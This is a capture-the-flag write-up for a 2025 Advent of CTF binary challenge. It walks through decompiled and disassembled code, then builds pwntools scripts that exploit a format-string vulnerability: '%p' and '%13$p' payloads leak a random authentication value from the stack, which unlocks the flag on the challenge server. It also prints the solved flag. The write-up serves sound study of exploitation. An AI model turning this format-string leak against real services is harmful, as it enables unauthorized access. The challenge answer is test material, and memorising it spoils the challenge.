# Solution
We are given an [telegram image](https://github.com/s1d15/Advent-of-CTF-2025/blob/main/day-07/telegram.png) which contains the link to our [executable](https://github.com/s1d15/Advent-of-CTF-2025/blob/main/day-07/collector).

First, I need to create my local `metadata.bin` to be able to execute it.

---

When decompile it in Ghidra, I get the following:
```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  uint uVar1;
  time_t tVar2;
  char *pcVar3;
  char local_38 [44];
  undefined4 local_c;
  
  init(param_1);
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  local_c = random();
LAB_00401531:
  printf("cmd: ");
  pcVar3 = fgets(local_38,0x20,stdin);
  if ((pcVar3 == (char *)0x0) || (uVar1 = parse_command(local_3 8), uVar1 == 4)) {
    return 0;
  }
  if (uVar1 < 5) {
    if (uVar1 == 3) {
      handle_admin(local_c);
      goto LAB_00401531;
    }
    if (uVar1 < 4) {
      if (uVar1 == 1) {
        handle_write();
      }
      else {
        if (uVar1 != 2) goto LAB_004015af;
        handle_read();
      }
      goto LAB_00401531;
    }
  }
LAB_004015af:
  puts("?");
  goto LAB_00401531;
}
```

I noticed the program using `srand()` to randomize the seed so we can't predict the random value.

If we take a look in the `parse_command()` function, we see a list of command that we can use.
```c
undefined8 parse_command(char *param_1)

{
  int iVar1;
  undefined8 uVar2;
  
  iVar1 = strncmp(param_1,"write",5);
  if (iVar1 == 0) {
    uVar2 = 1;
  }
  else {
    iVar1 = strncmp(param_1,"read",4);
    if (iVar1 == 0) {
      uVar2 = 2;
    }
    else {
      iVar1 = strncmp(param_1,"admin",5);
      if (iVar1 == 0) {
        uVar2 = 3;
      }
      else {
        iVar1 = strncmp(param_1,"quit",4);
        if (iVar1 == 0) {
          uVar2 = 4;
        }
        else {
          uVar2 = 0;
        }
      }
    }
  }
  return uVar2;
}
```

`handle_write()` simply stored our input and `handle_read()` will print the data. But there is a **format string vulnerability** in `handle_read()` function as the `printf()`doesn't have any format specifiers.

```c
void handle_read(void)

{
  puts("data:");
  printf(collected_data);
  return;
}
```

The `handle_admin()` function gets our input, convert it into an 4-byte integer, and compare it to the inital random value. If it is the same, the flag will be printed out.

```c
void handle_admin(int param_1)

{
  char *pcVar1;
  ulong uVar2;
  char local_118 [268];
  int local_c;
  
  printf("auth: ");
  pcVar1 = fgets(local_118,0x100,stdin);
  if (pcVar1 != (char *)0x0) {
    uVar2 = strtoul(local_118,(char **)0x0,10);
    local_c = (int)uVar2;
    if (local_c == param_1) {
      puts(metadata);
    }
    else {
      puts("denied");
    }
  }
  return;
}
```

So our idea here is to use the format string vulnerability to leak the random value on the stack, convert it into an 4-byte integer and use that integer to get the flag.

First, I use gdb to disassemble `collector` and `handle_admin()` function.
```asm
Dump of assembler code for function handle_admin:
   0x0000000000401472 <+0>:     endbr64
   0x0000000000401476 <+4>:     push   rbp
   0x0000000000401477 <+5>:     mov    rbp,rsp
   0x000000000040147a <+8>:     sub    rsp,0x120
   0x0000000000401481 <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x0000000000401487 <+21>:    lea    rax,[rip+0xbd9]        # 0x402067
   0x000000000040148e <+28>:    mov    rdi,rax
   0x0000000000401491 <+31>:    mov    eax,0x0
   0x0000000000401496 <+36>:    call   0x401150 <printf@plt>
   0x000000000040149b <+41>:    mov    rdx,QWORD PTR [rip+0x2bee]        # 0x404090 <stdin@GLIBC_2.2.5>
   0x00000000004014a2 <+48>:    lea    rax,[rbp-0x110]
   0x00000000004014a9 <+55>:    mov    esi,0x100
   0x00000000004014ae <+60>:    mov    rdi,rax
   0x00000000004014b1 <+63>:    call   0x401170 <fgets@plt>
   0x00000000004014b6 <+68>:    test   rax,rax
   0x00000000004014b9 <+71>:    je     0x401504 <handle_admin+146>
   0x00000000004014bb <+73>:    lea    rax,[rbp-0x110]
   0x00000000004014c2 <+80>:    mov    edx,0xa
   0x00000000004014c7 <+85>:    mov    esi,0x0
   0x00000000004014cc <+90>:    mov    rdi,rax
   0x00000000004014cf <+93>:    call   0x4011a0 <strtoul@plt>
   0x00000000004014d4 <+98>:    mov    DWORD PTR [rbp-0x4],eax
   0x00000000004014d7 <+101>:   mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004014da <+104>:   cmp    eax,DWORD PTR [rbp-0x114]
   0x00000000004014e0 <+110>:   jne    0x4014f3 <handle_admin+129>
   0x00000000004014e2 <+112>:   lea    rax,[rip+0x2bb7]        # 0x4040a0 <metadata>
   0x00000000004014e9 <+119>:   mov    rdi,rax
   0x00000000004014ec <+122>:   call   0x401110 <puts@plt>
   0x00000000004014f1 <+127>:   jmp    0x401505 <handle_admin+147>
   0x00000000004014f3 <+129>:   lea    rax,[rip+0xb74]        # 0x40206e
   0x00000000004014fa <+136>:   mov    rdi,rax
   0x00000000004014fd <+139>:   call   0x401110 <puts@plt>
   0x0000000000401502 <+144>:   jmp    0x401505 <handle_admin+147>
   0x0000000000401504 <+146>:   nop
   0x0000000000401505 <+147>:   leave
   0x0000000000401506 <+148>:   ret
```

There are two variable stored in `rbp-0x4` and `rbp-0x114`. If we try to input our value `12345` in `handle_admin()` and examine out each variable, we get:
```asm
gef➤  x $rbp-0x4
0x7fffffffdd4c: 0x00003039
gef➤  x $rbp-0x114
0x7fffffffdc3c: 0x5ada8a7f
```
`0x00003039` in decimal is indeed `12345`.

So, we need to use the `handle_read()` function to leak the loaded value `0x5ada8a7f` on the stack. 

First, I will use `handle_write()` function to input a sequence of `%p` to leak values on the stack, then use `handle_read()` function to read the values. I will use `python` and `pwntools` for this process.

```python
from pwn import *

context.terminal = ['tmux', 'split-window', '-h']

p = process('./collector')

script = '''
b *0x4014e0
c
'''

gdb.attach(p, gdbscript=script)

p.recvuntil(b'cmd: ')
p.sendline(b'write')
p.recvuntil(b'data: ')
p.sendline(b'%p ' * 64)
p.recvuntil(b'cmd: ')
p.sendline(b'read')
```
So, the stack values are:
```python
data:
0x7faa27dbd643 (nil) 0x7faa27cd55a4 0x5 (nil) 0x7fff6afc83c0 0x40159a 0xa64616572 (nil) (nil) 0x7faa27df8af0 0x7fff6afc84a0 0x1ddd256d6afc84e8 0x7fff6afc8460 0x7faa27be31ca 0x7fff6afc8410 0x7fff6afc84e8 0x100400040 0x401507 0x7fff6afc84e8 0x270a6b54c3a21238 0x1 (nil) 0x403e00 0x7faa27e10000 0x270a6b54ccc21238 0x27a0f1d1a8601238 0x7fff00000000 (nil) (nil) 0x1 0x7fff6afc84e0 0x7de1abe7fd6ac800 0x7fff6afc84c0 0x7faa27be328b 0x7fff6afc84f8 0x403e00 0x7fff6afc84f8 0x401507 (nil) (nil) 0x4011d0 0x7fff6afc84e0 (nil) (nil) (nil) 0x4011f5 0x7fff6afc84d8 0x38 0x1 0x7fff6afc91da (nil) 0x7fff6afc91e6 0x7fff6afc91f6 0x7fff6afc920e 0x7fff6afc9227 0x7fff6afc9252 0x7fff6afc9259 0x7fff6afc9270 0x7fff6afc9292 0x7fff6afc92c2 0x7fff6afc92cc 0x7fff6afc92f6 0x7fff6afc9304
```

And the random value is:
```asm
gef➤  x $rbp-0x114
0x7fff6afc826c: 0x1ddd256d
```

The 13$^{th}$ value is `0x1ddd256d6afc84e8`. We can see that the random value is the first 4 bytes of the 13$^{th}$ value.

We can access the 13$^{th}$ value using the syntax `%13$p`. Then we convert the value into integer and pass it into `handle_admin()` function.

```python
p.recvuntil(b'data:\n')
res = p.recvline().strip().decode()[2:10]
res = int(res, 16)
p.sendline(b'admin')
p.recvuntil(b'auth: ')
p.sendline(str(res).encode())
```

Finally, we get our test flag `csd{TestFlag}`.

Additionally, when connect to the remote server, we need to also answer the proof-of-work verification system. I'll also use `pwntools` to automate this process.

Final solution:
```python
from pwn import *

HOST, PORT = 'ctf.csd.lol', 7777

p = remote(HOST, PORT)
p.recvuntil(b' -s ')
challenge = p.recvline().decode().strip()
p2 = process(['/home/sidis/redpwnpow-linux-amd64', challenge])
ans = p2.recvline().strip().decode()
p.sendline(ans.encode())

p.recvuntil(b'cmd: ')
p.sendline(b'write')
p.recvuntil(b'data: ')
p.sendline(b'%13$p')
p.sendline(b'read')
p.recvuntil(b'data:\n')
res = p.recvline().strip().decode()[2:10]
res = int(res, 16)
p.sendline(b'admin')
p.recvuntil(b'auth: ')
p.sendline(str(res).encode())

p.interactive()
```

---

The `flag` is `csd{Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92}`